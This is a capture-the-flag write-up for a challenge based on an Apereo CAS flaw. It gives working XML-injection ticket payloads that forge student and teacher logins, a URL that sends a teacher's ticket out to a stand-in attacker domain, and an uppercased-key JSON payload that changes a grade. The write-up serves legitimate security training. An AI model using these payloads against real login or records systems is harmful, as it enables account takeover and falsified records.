# Writeup
## Inspiration
Based on Apero CAS, CVE-2017-1000071

## SSO Docs
Reading the html of the login page, shows a comment about TODOs which includes updating the swagger docs. Swagger is a common tool for sharing API documentation and can be accessed on /swagger of the sso.
This includes the /register which gives a new account.

## Auth-Bypass
Given the randomly generated student-account given upon request, check the SSO flow
Find the /validate path in swagger docs
Discover the service and ticket params, given the error
Discover the TGT- is needed
Discover the XML injection
Craft bypass ticket
fx http://grade.vcap.me/login?ticket=TGT-</authenticationFailure><authenticationSuccess><id>8a998821-31c7-11ed-b7f1-0242c0a8c002</id><username>student57895</username></authenticationSuccess><authenticationFailure>

## Find teacher-userid
Create a login-url for a exfil service
fx http://sso.vcap.me/login?service=http://hackerdomain.tld/example.jpg
Upload as profile-picture instead of base64 url
Trigger teacher-bot to read your message
Use teacher-userid to authenticate as teacher

http://grade.vcap.me/login?ticket=TGT-</authenticationFailure><authenticationSuccess><id>2f22e014-3aa1-11ed-9918-0242ac1c0002</id><username>teacher51289</username></authenticationSuccess><authenticationFailure>

## Change grade
Send update with grade change instead of note change. Due to overposting this allows for changing the grade. There is a filter which can be bypassed by uppercasing "Grade":

{"name":"Fundamentals of Cyber Security","values":{"Grade":"A"}}